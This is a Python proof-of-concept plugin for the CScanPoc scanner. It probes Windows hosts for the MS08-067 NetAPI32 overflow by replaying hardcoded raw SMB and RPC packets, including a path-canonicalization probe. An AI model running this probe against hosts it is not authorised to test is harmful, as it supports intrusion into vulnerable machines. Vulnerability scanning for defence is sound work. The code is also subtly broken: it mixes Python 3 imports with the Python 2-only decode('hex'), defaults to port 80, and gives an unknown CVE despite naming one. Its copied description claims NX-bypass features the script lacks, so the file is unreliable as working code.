# coding: utf-8
import socket
import urllib.parse
import socket

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Microsoft-Windows-Business-Server_0101'  # 平台漏洞编号，留空
    name = 'MS08-067 NetAPI32.dll 远程缓冲区溢出(CVE-2008-4250)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.OTHER  # 漏洞类型
    disclosure_date = '2015-04-19'  # 漏洞公布时间
    desc = '''
    MS08-067漏洞的全称为“Windows Server服务RPC请求缓冲区溢出漏洞”，如果用户在受影响的系统上收到特制的 RPC
    请求，则该漏洞可能允许远程执行代码。 在 Microsoft Windows 2000、Windows XP 和 Windows Server 2003 系统上，
    攻击者可能未经身份验证即可利用此漏洞运行任意代码，此漏洞可用于进行蠕虫攻击。
    -----
    This module exploits a parsing flaw in the path canonicalization code of NetAPI32.dll through the Server Service.
    This module is capable of bypassing NX on some operating systems and service packs. The correct target must be used to
    prevent the Server Service (along with a dozen others in the same process) from crashing. Windows XP targets seem to
    handle multiple successful exploitation events, but 2003 targets will often crash or hang on subsequent attempts. This
    is just the first version of this module, full support for NX bypass on 2003, along with other platforms, is still in
    development.
    '''  # 漏洞描述
    ref = 'https://labs.portcullis.co.uk/tools/ms08-067-check/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Microsoft-Windows-Business-Server'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '8ef76cb9-1e9d-4fa6-a7c7-5d4c0a175be2'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            target_parse = urllib.parse.urlparse(self.target)
            ip = socket.gethostbyname(target_parse.hostname)
            port = target_parse.port if target_parse.port else 80
            payload = [
                ('00000045ff534d427200000000000008000000000000000000000000ffff00000000000000220'
                 '0024e54204c4d20302e31320002534d4220322e3030320002534d4220322e3f3f3f00').decode('hex'),
                ('00000088ff534d427300000000080048000000000000000000000000ffffc42b000000000cff0'
                 '0000000f0020001000000000042000000000044c000804d00604006062b0601050502a0363034'
                 'a00e300c060a2b06010401823702020aa22204204e544c4d5353500001000000050288a000000'
                 '000000000000000000000000000556e69780053616d626100').decode('hex'),
                ('00000096ff534d427300000000080048000000000000000000000000ffffc42b010800000cff0'
                 '0000000f0020001000000000050000000000044c000805b00a14e304ca24a04484e544c4d5353'
                 '50000300000000000000480000000000000048000000000000004000000000000000400000000'
                 '8000800400000000000000048000000050288a04e0055004c004c00556e69780053616d626100').decode('hex'),
                '00000047ff534d427500000000080048000000000000000000000000ffffc42b0108000004ff000000000001001c0000'.decode(
                    'hex'),
                ('0000005cff534d42a2000000001801480000000000000000000000000108c42b0108000018ff0'
                 '00000000800160000000000000003000000000000000000000080000000010000000100000040'
                 '000000020000000009005c62726f7773657200').decode('hex'),
                ('00000092ff534d4225000000000801480000000000000000000000000108c42b0108000010000'
                 '048000004e0ff0000000000000000000000004a0048004a000200260000404f005c504950455c'
                 '0005000b03100000004800000001000000b810b810000000000100000000000100c84f324b701'
                 '6d30112785a47bf6ee18803000000045d888aeb1cc9119fe808002b10486002000000').decode('hex'),
                ('000000beff534d4225000000000801480000000000000000000000000108c42b0108000010000'
                 '074000004e0ff0000000000000000000000004a0074004a000200260000407b005c504950455c'
                 '00050000031000000074000000010000000000000000002000000002000100000000000000010'
                 '000000000aaaa0e000000000000000e0000005c00410041004100410041005c002e002e005c00'
                 '46004200560000000500000000000000050000005c004600420056000000aaaa0100000000000000').decode('hex'),
            ]

            def setuserid(userid, data):
                return data[:32]+userid+data[34:]

            def settreeid(treeid, data):
                return data[:28]+treeid+data[30:]

            def setfid(fid, data):
                return data[:67]+fid+data[69:]
            s = socket.socket()
            s.connect((ip, port))
            s.send(payload[0])
            s.recv(1024)
            s.send(payload[1])
            data = s.recv(1024)
            userid = data[32:34]
            s.send(setuserid(userid, payload[2]))
            s.recv(1024)
            data = setuserid(userid, payload[3])
            path = '\\\\\\\\%s\\\\IPC$\\x00' % ip
            path = path + (26-len(path))*'\\x3f'+'\\x00'
            data = data + path
            s.send(data)
            data = s.recv(1024)
            tid = data[28:30]
            s.send(settreeid(tid, setuserid(userid, payload[4])))
            data = s.recv(1024)
            fid = data[42:44]
            s.send(setfid(fid, settreeid(tid, setuserid(userid, payload[5]))))
            s.recv(1024)
            s.send(setfid(fid, settreeid(tid, setuserid(userid, payload[6]))))
            data = s.recv(1024)
            if data[9:13] == '\\x00'*4:
                self.output.report(self.vuln, '发现{ip}:{port}存在{name}漏洞'.format(
                    ip=ip, port=port, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
